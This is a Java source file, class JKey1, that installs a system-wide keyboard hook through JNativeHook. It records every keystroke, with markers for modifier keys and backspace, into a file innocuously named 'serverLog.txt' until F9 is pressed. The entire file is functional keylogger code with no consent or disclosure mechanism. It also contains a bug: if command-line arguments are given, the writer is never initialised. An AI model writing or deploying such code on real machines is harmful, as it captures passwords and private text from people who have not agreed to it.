package com.trigger.jkl;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.trigger.utils.FileContract;
import com.trigger.utils.FileOverWrite;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class JKey1 implements NativeKeyListener {
	
	private static FileContract fc;
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) 
	{
		String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Key Pressed: " + keyPressed);
		System.out.println("Key Pressed: " + e.getKeyCode());
		switch(e.getKeyCode())
		{
			case NativeKeyEvent.VC_ALT_L: 		fc.writeString("Alt[");
												return;
			case NativeKeyEvent.VC_ALT_R:	 	fc.writeString("Alt[");
												return;
			case NativeKeyEvent.VC_CONTROL_L: 	fc.writeString("Ctrl[");
												return;
			case NativeKeyEvent.VC_CONTROL_R: 	fc.writeString("Ctrl[");
												return;
			case NativeKeyEvent.VC_SHIFT_L: 	fc.writeString("^[");
												return;
			case NativeKeyEvent.VC_SHIFT_R: 	fc.writeString("^[");
												return;
			case NativeKeyEvent.VC_ENTER:	 	fc.writeEnter();
												return;
			case NativeKeyEvent.VC_BACKSPACE:	fc.writeString("(");
												fc.writeChar('\u2190');
												fc.writeString(")");
												return;
			case NativeKeyEvent.VC_SEMICOLON: 	fc.writeChar(';');
												return;
			case NativeKeyEvent.VC_PERIOD:	 	fc.writeChar('.');
												return;
			case NativeKeyEvent.VC_COMMA: 		fc.writeChar(',');
												return;
			case NativeKeyEvent.VC_BACK_SLASH: 	fc.writeChar('\\');
												return;
			case NativeKeyEvent.VC_SLASH:	 	fc.writeChar('/');
												return;
			case NativeKeyEvent.VC_MINUS:	 	fc.writeChar('-');
												return;
			case NativeKeyEvent.VC_EQUALS:	 	fc.writeChar('=');
												return;
			case NativeKeyEvent.VC_SPACE:	 	fc.writeChar(' ');
												return;
			case NativeKeyEvent.VC_KP_ADD:	 	fc.writeChar('+');
												return;
			case NativeKeyEvent.VC_KP_MULTIPLY:	fc.writeChar('*');
												return;
			case NativeKeyEvent.VC_OPEN_BRACKET:fc.writeChar('[');
												return;
			case NativeKeyEvent.VC_CLOSE_BRACKET:fc.writeChar(']');
												return;
			case NativeKeyEvent.VC_F9:			this.unregisterHook();
												return;
		}
		
		fc.writeString(keyPressed);	
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Key Released: " + keyPressed);
		switch(e.getKeyCode())
		{
			case NativeKeyEvent.VC_ALT_L: 		fc.writeString("]Alt");
												return;
			case NativeKeyEvent.VC_ALT_R:	 	fc.writeString("]Alt");
												return;
			case NativeKeyEvent.VC_CONTROL_L: 	fc.writeString("]Ctrl");
												return;
			case NativeKeyEvent.VC_CONTROL_R: 	fc.writeString("]Ctrl");
												return;
			case NativeKeyEvent.VC_SHIFT_L: 	fc.writeString("]^");
												return;
			case NativeKeyEvent.VC_SHIFT_R: 	fc.writeString("]^");
												return;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public static void main(String[] args) {
		
		if(args==null || args.length==0)
			fc = new FileOverWrite();			
		
		fc.initWriter("serverLog.txt");
		
		try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new JKey1());
	}
	
	private void unregisterHook()
	{
		try{
            GlobalScreen.unregisterNativeHook();
            fc.closeWriter();
        }catch(Exception ex){
            System.err.println(ex);
        }  
	}

}
